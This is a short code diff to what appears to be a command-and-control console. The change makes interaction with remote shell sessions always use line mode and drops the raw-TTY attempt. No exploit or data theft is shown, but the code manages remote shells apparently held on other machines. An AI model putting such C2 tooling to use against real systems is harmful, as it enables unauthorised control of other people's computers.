@@ -453,24 +453,9 @@ def interactive_shell_session(shell_id: int):
 def enter_shell_session(shell_id: int):
     """Wrapper to enter shell session.
 
-    Tries raw TTY mode if stdin is a TTY; otherwise falls back to line mode
-    where the console reads lines and forwards them to the shell.
+    Always uses line-mode to ensure stable interaction with bash/sh.
     """
     global current_session, line_mode_shell_id
-    try_raw = False
-    try:
-        try_raw = sys.stdin.isatty()
-    except Exception:
-        try_raw = False
-
-    if try_raw:
-        try:
-            interactive_shell_session(shell_id)
-            return
-        except Exception as e:
-            print(f"[*] Raw TTY mode failed ({e}). Falling back to line mode.")
-
-    # Fallback to line mode
     with global_lock:
         if shell_id not in shell_sessions:
             print("[!] Shell is no longer active.")
@@ -478,7 +463,7 @@ def enter_shell_session(shell_id: int):
         current_session = ('shell', shell_id)
         line_mode_shell_id = shell_id
     print(f"[+] Interacting with shell {shell_id} in line mode. Type commands and press Enter. Press Ctrl-C to return to C2 console.")
-    # Try to request a prompt immediately in line mode as well
+    # Try to request a prompt immediately in line mode
     try:
         shell_sessions[shell_id]['socket'].sendall(b'printf "%s" "${PS1:-$ }"\n')
     except Exception:
